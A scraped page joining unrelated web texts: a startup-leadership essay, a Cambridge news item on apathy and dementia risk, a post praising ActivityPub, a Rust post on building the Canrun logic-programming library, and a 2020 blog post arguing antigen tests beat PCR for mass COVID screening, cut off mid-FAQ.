solvable (a misunderstanding/miscommunication) or unsolvable (fundamental philosophical differences) and you can move on once you understand which is which.</p><p>But back to the original point, the <strong>actual </strong>worst thing for relationships within a team is <strong>uncertainty</strong>. </p><p>When I don’t know where you stand and you don’t know where I stand then we end up at an impasse that kills creativity and collaboration like no other. This is especially true in small, close knit teams.</p><p>If I’m in my corner expecting you to acknowledge my position and apologize to me and meanwhile you are huddled in yours, nothing gets done. Tensions flare. Feelings get hurt. Work becomes a chore, life gets hard.</p><p>On the flip side if you’re clear in your actions  —  <em>“I’m sorry, I don’t know if this was entirely my fault but I know there are things I could have done better and I apologize”</em> or <em>“I am not going to apologize as I believe strongly in X, Y Z”</em>.</p><p>Either of these two sentiments brings clarity to the situation. It’s quite possible or probably that someone might not agree, but it removes the tension of uncertainty and either shifts the situation more towards empathy and understanding or towards fundamental conflict  —  which as I mentioned before, is actually preferable to uncertainty.</p><p>Limbo kills relationships, partnerships, businesses, and probably house plants. Don’t allow any room for it in the culture you build.</p><p>‍</p><h3>3. Respect and love define a leader  —  not age, experience, title or role.</h3><p>Leadership is the process of helping others realize their own potential. It's about providing support, direction, assistance (when needed)&nbsp;and having the insight to know when to <strong>keep your mouth shut</strong>,</p><p>While strategies, tactics, styles and more vary the one thing that does not is the notion that leadership transcends surface level properties. The same way we don't associate eye color, hair, height, or weight with leadership ability, we should also be careful to attribute age, experience, title or role to the same.</p><p>While it may be true that most people don't rise to the level of their expectation but fall to the level of their training, where that level of expectation is in the first place will determine how far and deep the fall. The higher you set the expectation, the higher the eventual outcome. People are malleable and have the potential for infinite change, thus putting bounds on growth based on superficial characteristics holds an organization back more than anything else.</p><p>A&nbsp;leader is not defined by these characteristics but should rather be defined by the <strong>respect</strong> and <strong>love</strong> of the people they lead. While bringing love into a business context is not a normal thing to do, stories like that of Herb Kelleher ("A company is stronger if it is bound by <strong><em>love</em></strong> rather than by fear.") give us indication that the sterile, emotionless bubble business has long been associated with may not be the most effective way to go.</p><p>Measure yourself by respect and love and your team, your company, and maybe someday even the world, will thank you for it.</p><p>‍<br></p><h3>4. Don’t equate long work for hard work.</h3><p>Long work usually means inefficient process, unrefined planning or lack of understanding the true goal. Of course sometimes with deadlines and the grind of a startup long hours are unavoidable, but in general long does not mean hard (at least, well, not in this context) and sometimes 4 hours of focused, primed, <strong>hard </strong>work can beat 12 hours of unfocused muddling.</p><p>The other important things here is to never expect your team to work more than you do and to not hold people to a standard of working insane hours. Hours do not prove loyalty, they do not prove respect and they do not prove buy-in to the mission. </p><p>Asking people to go above and beyond should be a tool that’s used only when it’s needed and therefore a tool that should barely be used at all because at the end of the day building a lasting business is a marathon, not a sprint, and as a marathon runner I can safely say that <strong>pacing</strong>. <strong>is</strong>. <strong>everything</strong>.</p><p>‍</p><h3>5. In times of conflict  —  breathe, empathize, return.</h3><p>As a recovering hot head, dealing with conflict maturely and in a matter that de-escalates the situation has never been my strong suit. I’ve had to discover strategies the hard way and have collected advice the easy way all of which effectively come back to the same thing — <strong>add an interrupt</strong>.</p><p>Moments of passion rarely lead to positive outcomes (in this context, at least) so the rule of backing up, breathing (6 deep breaths, lowering that blood pressure), trying to empathize with the person (or people) on the other end, and then coming back to the situation helps almost <strong>every time.</strong></p><p>A thoughtless Slack message can be just as damaging to a relationship as a rude comment or public shaming, so adding a pattern interrupt is crucial to avoid putting your foot in your mouth as much as humanly possible.</p><p>‍</p><h3>6. Before you can win, you have to make sure everyone is playing the same game.</h3><p>A company is nothing more than a loose organization of people working towards the same goal. But if there is any crack in this shared reality, any fuzz in this vision of the future that you are working towards, then it becomes difficult to move forward quickly or effectively.</p><p>It’s difficult to win if you’re not playing the same game and impossible to play unless you’re all on the same field. Err towards <strong>oversharing</strong> and <strong>over-communicating</strong>, especially when it comes to things like mission, vision, culture and roadmap.</p><p>As the saying goes, <em>“If you want to build a ship, don’t drum up the men to gather wood, divide the work, and give orders. Instead, teach </em><strong><em>them</em></strong><em> to </em><strong><em>yearn</em></strong><em> for the vast and endless </em><strong><em>sea</em></strong><em>.” </em>It’s the job of a leader to set priorities and to cultivate that yearning by making sure each and every person with you has the same image of the endless sparkling water just beyond their reach.</p><p>‍</p><h3>7. Things don’t gain importance by …</h3></div></div></div></div></div>

SVD may occur in one out of three elderly individuals, causes about a quarter of all strokes, and is the most common cause of vascular dementia.</p><p>The team studied two independent cohorts of SVD patients, one from the UK and the other from the Netherlands.* Across both cohorts, they found that individuals with higher baseline apathy, as well as those with increasing apathy over time, had a greater risk of dementia. In contrast, neither baseline depression nor change in depression had any detectable influence on dementia risk.</p><p>These findings were consistent despite variation in the severity of participants’ symptoms, suggesting that they could be generalised across a broad spectrum of SVD cases. The relationship between apathy and dementia remained after controlling for other well-established risk factors for dementia including age, education, and cognition.</p><p>Lead author, Jonathan Tay, from Cambridge’s Department of Clinical Neurosciences said: “There has been a lot of conflicting research on the association between late-life depression and dementia. Our study suggests that may partially be due to common clinical depression scales not distinguishing between depression and apathy.”</p><p>Apathy, defined as a reduction in ‘goal-directed behaviour’, is a common neuropsychiatric symptom in SVD, and is distinct from depression, which is another symptom in SVD. Although there is some symptomatic overlap between the two, previous MRI research linked apathy, but not depression, with white matter network damage in SVD.</p><p>Jonathan Tay said: “Continued monitoring of apathy may be used to assess changes in dementia risk and inform diagnosis. Individuals identified as having high apathy, or increasing apathy over time, could be sent for more detailed clinical examinations, or be recommended for treatment.”</p><p>Over 450 participants - all with MRI-confirmed SVD - recruited from three hospitals in South London and Radboud University’s Neurology Department in the Netherlands, were assessed for apathy, depression and dementia over several years.</p><p>In the UK cohort, nearly 20% of participants developed dementia, while 11% in the Netherlands cohort did, likely due to the more severe burden of SVD in the UK cohort. In both datasets, patients who later developed dementia showed higher apathy, but similar levels of depression at baseline, compared to patients who did not.</p><p>The study provides the basis for further research, including the mechanisms that link apathy, vascular cognitive impairment, and dementia. Recent MRI work suggests that similar white matter networks underlie motivation and cognitive function in SVD. Cerebrovascular disease, which can be caused by hypertension and diabetes, can lead to network damage, resulting in an early form of dementia, presenting with apathy and cognitive deficits. Over time, SVD-related pathology increases, which is paralleled by increasing cognitive and motivational impairment, eventually becoming severe enough to meet criteria for a dementia state.</p><p>Jonathan Tay says: “This implies that apathy is not a risk factor for dementia per se, but rather an early symptom of white matter network damage. Understanding these relationships better could have major implications for the diagnosis and treatment of patients in the future.”</p><p>–</p><p><i>This article is republished from the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.cam.ac.uk%2F&amp;t=ZTk4NDQxMGYwMWI1YjBlM2U5NDg5NTg0ZGU3MDU3Mzc5NGEyMWZhMyxtN1YxVUl0Ng%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F623746641320624128%2Flink-between-dementia-and-apathy&amp;m=0">University of Cambridge</a> under a Creative Commons license.

<p>I’ll admit, I’ve spent the last several years disillusioned with technology. All the quirky little tools people made gave way to ad-fueled companies that refused to play well with others.</p>



<p>This is the first time I’ve been excited for a new technology in memory.</p>



<p>ActivityPub is to HTTP what HTTP was to TCP/IP. TCP/IP bridged disparate systems and allowed them to communicate reliably. HTTP allowed the various services built on TCP/IP to communicate with each other reliably.</p>



<p>ActivityPub goes one step further and provides a way for users on those services to communicate in a way that has the appearance of directness. I can follow, for example, Blender’s videos on PeerTube from my Mastodon account. Or I can use a blog platform that speaks ActivityPub and let people follow it from other services. It’s all the best features of Twitter with the flexibility of RSS. And unlike Twitter, your Mastodon profile will probably never lose its RSS feed in a company’s pursuit of profit. The main project already funds itself through Patreon, as do most of the larger instances.</p>



<p>It’s still early. We could be looking at a situation like Usenet and Gopher where neither ended up being The Thing because AOL soaked up the nascent public internet, then Facebook soaked up the nascent commercial web.</p>



<p>Right now the popularity of Mastodon carries ActivityPub while projects like Plume (blogging), Pixelfed (image sharing), and others work toward their potential.</p>



<p>I have noticed a tendency for people supporting older, similar protocols to wonder why ActivityPub got so popular while their own stagnated. We could speculate. If people knew Ostatus at all, they understood it as a protocol for making Twitter clones. XMPP spoke XML in an age of JSON, and it was perceived as an instant messenger protocol.</p>



<p>Both focused on liberating people from commercial silos. Mastodon had some press to that effect regarding Twitter, but people on there have come to care less as its native and diverse community grows to a self-sufficient level.</p>



<p>Twitter and Facebook are struggling to cope with their place in a massive cultural shift and shaky transfer of generational power. As I write this, Facebook has just lost 25% of its share price on the announcement that it expects weak growth.</p>



<p>I think the growing ActivityPub federation has a good chance. No one interacts with my tweets anymore. Meanwhile, I get response <a href="https://tech.lgbt/@Kye">on Mastodon</a> that reminds me of the early days of Twitter, before they betrayed their developer community and hired a legion of people to cut ad deals.</p>

    <main>
        <p><a href="https://github.com/tgecho/canrun_rs">Canrun</a> is a new logic programming library for Rust with static types and constraints.</p>
<p>In my <a href="https://esimmler.com/building-canrun-part-1/announcing-canrun/">initial post</a> I mentioned going through a few fundamental revisions before settling on the current approach. Here I'll try to do a quick recap for two reasons: 1) I think it's neat, and 2) with luck I'll snag the attention of someone with deeper experience and a willingness to share some tips.</p>
<p>My first successful attempt was actually based on an article by Tom Stuart titled <a href="https://codon.com/hello-declarative-world">"Hello, declarative world"</a><sup><a href="#reading">1</a></sup>, which described a way to implement <a href="http://webyrd.net/scheme-2013/papers/HemannMuKanren2013.pdf">μKanren</a> in Ruby<sup><a href="#languages">2</a></sup>. I recommend reading that if you find yourself confused about any of the "why" I gloss over here.</p>
<h2 id="starting-out">Starting Out</h2>
<p>The core moving part is the <code>State</code>. In its most basic form, it consists of a mapping between "logic variables" (we'll call them <code>LVar</code>) and "logic values" (or <code>Val&lt;T&gt;</code>). Note that a <code>Val&lt;T&gt;</code> can contain an <code>LVar</code> <em>or</em> a resolved <code>T</code>.</p>
<p><em>Note: These code samples are heavily abridged. Many aspects including lifetime annotations have been elided for the sake of clarity.</em></p>
<pre><code><span>pub struct </span><span>State</span><span>&lt;T&gt; {
    </span><span>values</span><span>: HashMap&lt;LVar, Val&lt;T&gt;&gt;,
}

</span><span>pub enum </span><span>Val</span><span>&lt;T&gt; {
    Var(LVar),
    Resolved(Rc&lt;T&gt;),
}
</span></code></pre>
<p>The public API essentially provides a way to "attempt" the addition of new bindings (through <a href="https://codon.com/hello-declarative-world#unification">unification</a>) and resolve existing bindings.</p>
<pre><code><span>impl </span><span>State</span><span>&lt;T&gt; {
    </span><span>pub fn </span><span>unify</span><span>(</span><span>&amp;</span><span>self</span><span>, </span><span>a</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;, </span><span>b</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;) -&gt; StateIter&lt;T&gt;;
    </span><span>pub fn </span><span>resolve</span><span>(</span><span>&amp;</span><span>self</span><span>, </span><span>val</span><span>: </span><span>&amp;</span><span>LVar) -&gt; </span><span>Option</span><span>&lt;Val&lt;T&gt;&gt;;
}
</span></code></pre>
<p>A key characteristic of this model is that <code>.unify(...)</code> returns a new <code>State</code> instead of mutating <code>Self</code>.</p>
<p>The return type of <code>.unify(...)</code> is an alias:</p>
<pre><code><span>pub type </span><span>StateIter</span><span>&lt;</span><span>T</span><span>&gt; = </span><span>Box</span><span>&lt;dyn </span><span>Iterator</span><span>&lt;Item = State&lt;T&gt;&gt;&gt;;
</span></code></pre>
<p>A <code>Goal</code> is a struct that simply returns an <code>Iterator</code> of potential states (yes, I said "<em>simply</em> returns an <code>Iterator</code>"... what's so funny?).</p>
<pre><code><span>pub enum </span><span>Goal</span><span>&lt;T&gt; {
    Unify {a: Val&lt;T&gt;, b: Val&lt;T&gt;},
    Either { a: </span><span>Box</span><span>&lt;Goal&lt;T&gt;&gt;, b: </span><span>Box</span><span>&lt;Goal&lt;T&gt;&gt; },
    </span><span>// ... truncated
</span><span>}

</span><span>impl </span><span>Goal</span><span>&lt;T&gt; {
    </span><span>fn </span><span>run</span><span>&lt;T: CanT&gt;(</span><span>&amp;</span><span>self</span><span>, </span><span>state</span><span>: </span><span>&amp;</span><span>State&lt;T&gt;) -&gt; StateIter&lt;T&gt; {
        </span><span>match </span><span>self </span><span>{
            Unify {a, b} </span><span>=&gt; </span><span>{
                </span><span>Box</span><span>::new(</span><span>once</span><span>(state.</span><span>unify</span><span>(a, b)))
            },
            Either {a, b} </span><span>=&gt; </span><span>{
                </span><span>let</span><span> a_iter </span><span>=</span><span> a.</span><span>run</span><span>(state);
                </span><span>let</span><span> b_iter </span><span>=</span><span> b.</span><span>run</span><span>(state);
                </span><span>Box</span><span>::new(a_iter.</span><span>interleave</span><span>(b_iter))
            }
            </span><span>// ... truncated
        </span><span>}
    }
}
</span></code></pre>
<p>These goals can be combined arbitrarily to create more complicated goals.</p>
<pre><code><span>let</span><span> goal </span><span>=</span><span> Either {
    a: Unify { a: x, b: </span><span>1</span><span>},
    b: Both {
        a: Unify { a: x, b: </span><span>2 </span><span>},
        a: Unify { a: y, b: </span><span>1 </span><span>},
    },
};
</span></code></pre>
<p>A goal can return as many new states as needed. It worked! Well, eventually. After a small war of attrition against the borrow checker, I finally managed get the streams flowing. Many clones were sacrificed.</p>
<p>With a few helper functions and some trait driven type coercion, the API wasn't too bad!</p>
<pre><code><span>let</span><span> state </span><span>= </span><span>State::new();
</span><span>let</span><span> goal: Goal&lt;</span><span>i32</span><span>&gt; </span><span>= </span><span>either</span><span>(
    </span><span>unify</span><span>(x, </span><span>1</span><span>),
    </span><span>both</span><span>(</span><span>unify</span><span>(x, </span><span>2 </span><span>), </span><span>unify</span><span>(y, </span><span>1 </span><span>)),
);
goal.</span><span>run</span><span>(state) </span><span>// &lt;- returns an iterator of potential states
</span></code></pre><h2 id="smooth-sailing">Smooth Sailing?</h2>
<p>I pushed forward, implementing the other types of goals and learning more about ownership, how and when to use enums vs trait objects and more. But I couldn't shake the feeling that I was fighting more than just the borrow checker.</p>
<p>On top of excessive cloning, I was also struggling with a lack of type safety. My initial plan was for the <code>T</code> type parameter to be a user defined enum.</p>
<pre><code><span>enum </span><span>MyType </span><span>{
    Number(</span><span>i32</span><span>),
    Word(</span><span>String</span><span>),
}

</span><span>// This compiles, but can never succeed!
</span><span>let</span><span> goal: Goal&lt;MyType&gt; </span><span>= </span><span>unify</span><span>(
    MyType::Number(</span><span>42</span><span>),
    MyType::Word(</span><span>"42"</span><span>),
);
</span></code></pre>
<p>Essentially, all relations in the "logic world" were dynamically typed.</p>
<p>I needed a new approach.</p>
<h2 id="rust-is-different">Rust is Different</h2>
<p>An interesting thing about Rust is that it pulls so much from functional programming, but trying to use a "pure immutable" style as in a typical garbage collected language can get really uncomfortable. This sort of pain is usually a sign that something needs to change.</p>
<p>My new mutable <code>State</code> adds a <code>.fork(...)</code> operation and tweaks <code>.unify(...)</code>:</p>
<pre><code><span>impl </span><span>State</span><span>&lt;T&gt; {
    </span><span>pub fn </span><span>unify</span><span>(</span><span>mut </span><span>self</span><span>, </span><span>a</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;, </span><span>b</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;) -&gt; </span><span>Option</span><span>&lt;</span><span>Self</span><span>&gt;;
    </span><span>pub fn </span><span>fork</span><span>(</span><span>mut </span><span>self</span><span>, </span><span>fork</span><span>: Rc&lt;dyn Fork&lt;T&gt;&gt;) -&gt; </span><span>Option</span><span>&lt;</span><span>Self</span><span>&gt;;
}

</span><span>pub trait </span><span>Fork</span><span>&lt;T&gt; {
    </span><span>fn </span><span>run</span><span>(</span><span>&amp;</span><span>self</span><span>, </span><span>state</span><span>: State&lt;T&gt;) -&gt; StateIter&lt;T&gt;;
}
</span></code></pre>
<p>Note that both functions take a <code>mut self</code> and return an <code>Option&lt;Self&gt;</code>. The <code>.unify(...)</code> function eagerly attempts to reconcile bindings with those already contained in the state. If unification fails, the entire state is now invalid. We can bail right away with <code>None</code> and avoid processing any additional updates. Used with the <code>?</code> try operator, this can actually be quite smooth.</p>
<pre><code><span>State::new()
    .</span><span>unify</span><span>(x, </span><span>1</span><span>)</span><span>? </span><span>// &lt;- returns Some(state)
    </span><span>.</span><span>unify</span><span>(x, </span><span>2</span><span>)</span><span>? </span><span>// &lt;- returns None
</span></code></pre>
<p>The simplest <code>Goal</code> that would use <code>Fork</code> is <code>Either</code>, where you'll get zero or more results states for both sides:</p>
<pre><code><span>let</span><span> goal </span><span>= </span><span>either</span><span>(
    </span><span>unify</span><span>(x, </span><span>1</span><span>),
    </span><span>unify</span><span>(x, </span><span>2</span><span>),
);
</span></code></pre>
<p>By deferring evaluation of the <code>Fork</code> objects, we do as much work to disprove as many goals as possible <em>before</em> we eventually split into an arbitrary number of result states.</p>
<p>The <code>Fork</code> trait's <code>.run(...)</code> is not invoked until we query for results. At that point, we recurse our way through the list of <code>Fork</code> items as a queue, branching out at each iteration.</p>
<pre><code><span>fn </span><span>iter_forks</span><span>(</span><span>mut </span><span>self</span><span>) -&gt; StateIter&lt;</span><span>'a</span><span>, D&gt; {
    </span><span>let</span><span> fork </span><span>= </span><span>self</span><span>.forks.</span><span>pop_front</span><span>();
    </span><span>match</span><span> fork {
        </span><span>None </span><span>=&gt; </span><span>Box</span><span>::new(</span><span>once</span><span>(</span><span>self</span><span>)),
        </span><span>Some</span><span>(fork) </span><span>=&gt; </span><span>Box</span><span>::new(fork.</span><span>run</span><span>(</span><span>self</span><span>).</span><span>flat_map</span><span>(State::iter_forks)),
    }
}
</span></code></pre>
<p>Note that <code>iter_forks(..)</code> does not clone the <code>State</code>. The struct that implements <code>Fork</code> <em>may</em> clone the <code>State</code> at the last moment, but only if actually needed.</p>
<p>In a nutshell:</p>
<ul>
<li><code>.unify(...)</code> eagerly converges, constraining the <code>State</code> into zero or one possible outcomes.</li>
<li><code>.fork(...)</code> lazily diverges, splitting a <code>State</code> into zero or more alternate possibilities.</li>
</ul>
<h2 id="typing-the-domain">Typing the Domain</h2>
<p><em>Statically typed</em> logic programming seems to be a small niche within the niche that is regular logic programming.<sup><a href="#typedlogic">3</a></sup></p>
<p>After a walking down a few dead ends, I settled on an approached based on procedural macros.</p>
<pre><code><span>domain! </span><span>{
    </span><span>pub</span><span> MyDomain {
        </span><span>i32</span><span>,
        </span><span>String
    </span><span>}
}
</span></code></pre>
<p>The <code>domain!</code> macro can create a struct with associated functions that enable it to store and retrieve collections of values compatible with a user defined domain <em>by type</em><sup><a href="#anymap">4</a></sup>. The generated struct looks (roughly) like this:</p>
<pre><code><span>pub struct </span><span>MyDomain </span><span>{
    </span><span>t0</span><span>: HashMap&lt;LVar&lt;</span><span>i32</span><span>&gt;, Val&lt;</span><span>i32</span><span>&gt;&gt;,
    </span><span>t1</span><span>: HashMap&lt;LVar&lt;</span><span>String</span><span>&gt;, Val&lt;</span><span>String</span><span>&gt;&gt;,
}
</span></code></pre>
<p>With pseudo-private<sup><a href="#privacy">5</a></sup> accessors that can be used to retreive the inner containers:</p>
<pre><code><span>impl</span><span>&lt;</span><span>'a</span><span>&gt; DomainType&lt;</span><span>'a</span><span>, </span><span>i32</span><span>&gt; </span><span>for </span><span>MyDomain </span><span>{
    </span><span>fn </span><span>values_as_ref</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; </span><span>&amp;</span><span>HashMap&lt;LVar&lt;</span><span>i32</span><span>&gt;, Val&lt;</span><span>i32</span><span>&gt;&gt; {
        </span><span>&amp;</span><span>self</span><span>.t0
    }
    </span><span>fn </span><span>values_as_mut</span><span>(</span><span>&amp;</span><span>mut </span><span>self</span><span>) -&gt; </span><span>&amp;</span><span>mut </span><span>HashMap&lt;LVar&lt;</span><span>i32</span><span>&gt;, Val&lt;</span><span>i32</span><span>&gt;&gt; {
        </span><span>&amp;</span><span>mut </span><span>self</span><span>.t0
    }
}
</span></code></pre>
<p>The <code>State</code> struct is now parameterized with a <code>Domain</code> type, to which it delegates management of the individual <code>Val&lt;T&gt;</code> containers (some of this is actually spread into other traits/impls, but this is essentially what happens):</p>
<pre><code><span>impl </span><span>&lt;D: Domain&gt; </span><span>State</span><span>&lt;D&gt; {
    </span><span>pub fn </span><span>resolve_val</span><span>&lt;T&gt;(</span><span>&amp;</span><span>self</span><span>, </span><span>val</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;) -&gt; </span><span>&amp;</span><span>Val&lt;T&gt;
    </span><span>where</span><span>
        D: DomainType&lt;T&gt;,
    {
        </span><span>match</span><span> val {
            Val::Var(var) </span><span>=&gt; </span><span>{
                </span><span>let</span><span> resolved </span><span>= </span><span>self</span><span>.domain.</span><span>values_as_ref</span><span>().</span><span>get</span><span>(var);
                </span><span>match</span><span> resolved {
                    </span><span>// We found another Var, try to resolve deeper
                    </span><span>Some</span><span>(found) </span><span>=&gt; </span><span>self</span><span>.</span><span>resolve_val</span><span>(found),
                    </span><span>// We didn't find a binding, return the Var
                    </span><span>None </span><span>=&gt;</span><span> val,
                }
            }
            </span><span>// This isn't a Var, just return it
</span><span>            value </span><span>=&gt;</span><span> value,
        }
    }
}
</span></code></pre>
<p>Goals are also parameterized by <code>Domain</code>:</p>
<pre><code><span>// Compiles!
</span><span>let</span><span> goal </span><span>= </span><span>Goal&lt;MyDomain&gt; </span><span>= </span><span>unify</span><span>(x, </span><span>1</span><span>);
</span><span>// Does not compile :)
</span><span>let</span><span> goal </span><span>= </span><span>Goal&lt;MyDomain&gt; </span><span>= </span><span>unify</span><span>(x, </span><span>vec!</span><span>[</span><span>1</span><span>, </span><span>2</span><span>]);
</span></code></pre>
<p>While the macro approach feels a bit idiosyncratic, it does have a few really nice properties. Most notably: explicitly defining all of the types that should be valid in the <em>logic</em> domain greatly increases the helpfulness of compiler errors.</p>
<h2 id="takeaways">Takeaways</h2>
<ul>
<li>In Rust (as elsewhere), pain is an indication that you may want to reconsider your approach.</li>
<li>Studying prior art is important, but take its original context into account to avoid imitating badly. A different context might require different choices.</li>
<li><a href="https://github.com/dtolnay">David Tolnay's</a> <a href="https://github.com/dtolnay/quote">quote</a> and <a href="https://github.com/dtolnay/syn">syn</a> libraries make my rather raw proc macro way nicer than it has any business being.</li>
</ul>

  <p><span>15 Jul 2020</span></p><p><em>[Disclaimer: I am not an epidemiologist. The models presented here make simplifying assumptions.]</em></p>

<p>If we want to reopen schools and offices, we need to do so safely. According to Nobel Prize winning economist Paul Romer, the best way is with <a href="https://schools.paulromer.net/">frequent</a> and <a href="https://paulromer.net/faqs-on-virus-tests-in-schools/">regular</a> testing of asymptomatic students and employees. Catching infections early can stop the spread before it starts.</p>

<p>Much of the discussion about testing has centered on <a href="https://www.npr.org/sections/health-shots/2020/05/01/847368012/how-reliable-are-covid-19-tests-depends-which-one-you-mean">PCR</a>, a relatively expensive method that is vulnerable to <a href="https://www.npr.org/2020/05/28/863558750/coronavirus-testing-machines-are-latest-bottleneck-in-troubled-supply-chain">multiple</a> <a href="https://www.latimes.com/california/story/2020-07-12/california-fail-coronavirus-testing-covid-start">supply chain</a> bottlenecks and is generally <a href="https://www.technologyreview.com/2020/05/06/1001150/podcast-covid-19-testing-bottleneck/">hard to scale up</a>. Test samples must be sent to a central laboratory and then passed through expensive machines, a process that is currently taking 5-7 days, and in some places as high as <a href="https://twitter.com/SFCovidTestWait/status/1283122098714693633">10-13 days</a>. Efforts are being made to speed this up via pooling, but the operational complexity of PCR makes it likely that there will always be at least a few days of delay.</p>

<p>A less talked about alternative to PCR is called <em><a href="https://www.sciencemag.org/news/2020/05/coronavirus-antigen-tests-quick-and-cheap-too-often-wrong">antigen tests</a></em>. These tests are much cheaper than PCR, with estimates ranging between <a href="https://www.sciencemag.org/news/2020/05/coronavirus-antigen-tests-quick-and-cheap-too-often-wrong">$1</a> and <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">$10</a> per test, compared to <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">$50</a> for PCR. More importantly, they can return results in just <a href="https://www.cdc.gov/flu/professionals/diagnosis/clinician_guidance_ridt.htm">15 minutes</a>, without any need to send samples to a central lab.</p>

<p>Since antigen tests are far cheaper and faster than PCR, why are we not massively investing in them?</p>

<p>The usual answer is test accuracy. SARS-CoV-2 antigen tests have a sensitivity of about <a href="https://www.nytimes.com/2020/07/06/health/fast-coronavirus-tests.html">85-90%</a>, meaning that only 85%-90% of true cases will be detected as such. And those are optimistic estimates reported by test manufacturers. For influenza, the CDC reports that antigen tests have a sensitivity of <a href="https://www.cdc.gov/flu/professionals/diagnosis/clinician_guidance_ridt.htm">50-70%</a>. This is much lower than PCR tests, which have a sensitivity as high at <a href="https://www.medrxiv.org/content/10.1101/2020.05.26.20112565v1.full.pdf">98%</a>.</p>

<p>Some doctors view the low sensitivity as an insurmountable hurdle. “It won’t work”, <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">said</a> one doctor. “A misdiagnosis is worse than no diagnosis”, <a href="https://www.sciencemag.org/news/2020/05/coronavirus-antigen-tests-quick-and-cheap-too-often-wrong">said</a> another.</p>

<p>I am not sure I agree, at least when it comes to mass testing of asymptomatic individuals. In this blog post I will show, via both simulations and analytical arguments, that the low sensitivity of antigen tests is a much better problem to have than the long delay of a PCR test.</p>

<h3 id="simulations">Simulations</h3>

<p>To test this hypothesis, I built an <a href="https://github.com/csaid/covid_model_with_testing/blob/master/SIR%20model%20with%20testing.ipynb">agent-based SIR model</a> that includes testing and quarantining. I make the following key assumptions:</p>

<ul>
  <li>Population of 200 students</li>
  <li>Using a rotation system, each student is tested once every K days.</li>
  <li>Students go into a 14 day quarantine if they get positive test results.</li>
  <li>In addition to intra-school infections, each student has a chance of getting infected by someone outside the population.</li>
</ul>

<p>I <a href="https://github.com/csaid/covid_model_with_testing/blob/master/SIR%20model%20with%20testing.ipynb">simulated</a> two different scenarios.</p>

<ul>
  <li>Regular PCR testing (sensitivity of 98%, testing delay of 5 days)</li>
  <li>Regular antigen testing (sensitivity of 75%, no testing delay)</li>
</ul>

<p>For comparison, I also modeled a “best case scenario”, where no intra-school infections occur, and a “worst case scenario”, where there is no testing or quarantining at all.</p>

<p>Assuming that each student is tested once every 4 days, I find that the cumulative number of infections is far lower if we do regular antigen testing than if we do regular PCR testing.</p>

<p><img src="https://chris-said.io/assets/2020_antigen_testing/fig_test_every_4_days.png">
</p>


<p>If we change the frequency of testing to once every day, antigen testing is able to achieve close to best case results, with almost no intra-school infections. Meanwhile, daily PCR testing still results in a large number of infections.</p>

<p><img src="https://chris-said.io/assets/2020_antigen_testing/fig_test_every_1_day.png">
</p>


<p>This seems very important. <em>Not only are antigen tests cheaper than PCR, they are also more effective in a mass testing regime.</em> Further simulations in my <a href="https://github.com/csaid/covid_model_with_testing/blob/master/SIR%20model%20with%20testing.ipynb">notebook</a> show that the superiority of antigen tests is maintained even for much lower sensitivities.</p>

<h3 id="why-is-low-sensitivity-better-than-slowness">Why is low sensitivity better than slowness?</h3>

<p>Maybe you don’t believe my simulations, so here’s an analytical argument instead. Imagine you test people every day using a 75% sensitive antigen test. If someone is infected, they will probably find out immediately. There is a smallish chance they will first find out after a day, and a very small chance it will take longer than that. On average they will find out after 0.33 days, which is much faster than a typical PCR test. In general, for a sensitivity of , daily antigen test participants will find out after an average of  days, where  is defined as:</p>



<p>which converges to</p>



<p>For any reasonable value of ,  will be quite low. Here’s a striking example. If you test people every day, a test with 50% sensitivity and no delay is equivalent to a test with 100% sensitivity and a 1-day delay!</p>

<p>This analysis assumes that  is fixed across time and individuals, an assumption I’ll address in the FAQ, below.</p>

<h3 id="faq">FAQ:</h3>

<p><strong>Q:</strong> <em>What is your main conclusion from this analysis?</em>
<br> <strong>A:</strong> For mass testing of asymptomatic individuals in schools and offices, antigen tests are cheaper and more effective than PCR tests.</p>

<p><strong>Q:</strong> <em>Have other people come to this conclusion?</em>
<br> <strong>A:</strong> Yes. After writing this blog post, I came across two recent pre-prints.</p>
<ul>
  <li><a href="https://www.medrxiv.org/content/10.1101/2020.06.22.20136309v2.full.pdf">Larremore et al.</a> shows that sensitivity is less important than testing delays. It comes with a wonderful <a href="https://larremorelab.github.io/covid-calculator3">interactive calculator</a>.</li>
  <li><a href="https://www.medrxiv.org/content/10.1101/2020.07.06.20147702v1.full.pdf">Paltiel et al.</a> show that sensitivity is less important than test frequency.</li>
</ul>

<p><strong>Q:</strong> <em>Are you arguing that antigen tests should always replace PCR?</em>
<br> <strong>A:</strong> No, I’m only suggesting it for mass testing of asymptomatic individuals. If a symptomatic person comes into a doctor’s office a PCR test would make sense, since sensitivity becomes more important and cost becomes less important.</p>

<p><strong>Q:</strong> <em>What if the antigen test has a much lower sensitivity for certain individuals, who will therefore remain undetected?</em>
<br> <strong>A:</strong> Low sensitivity for these individuals is <a href="https://www.sciencedirect.com/science/article/abs/pii/S138665321000106X">likely due to low viral load</a>, which most researchers believe means they will not be very infectious. That said, if would be really good if we could get more research on this, since it’s an important question.</p>

<p><strong>Q:</strong> <em>What if the sensitivity of the antigen test is especially low at the start of infection?</em>
<br> <strong>A:</strong> Another good question. As with the previous answer, this period of low sensitivity would likely be to due low viral load, when the individual is less infectious. Furthermore, the period where PCR tests can detect the virus while antigen tests cannot is <a href="https://www.medrxiv.org/content/10.1101/2020.06.22.20136309v2.full.pdf">probably only 24 hours</a>. But <em>even if</em> we assume the individual is just as infectious during this early period, the antigen test still remains superior. To estimate this, I ran simulations where antigen tests were completely ineffective for the first two days of infection, a conservative assumption. Even with this conservative constraint, and even assuming the individuals are fully infectious during this period, antigen tests still outperformed PCR.</p>

<p><img src="https://chris-said.io/assets/2020_antigen_testing/fig_test_every_1_day_delayed_detection.png">
</p>


<p><strong>Q:</strong> <em>What if the false negatives cause riskier behavior?</em>
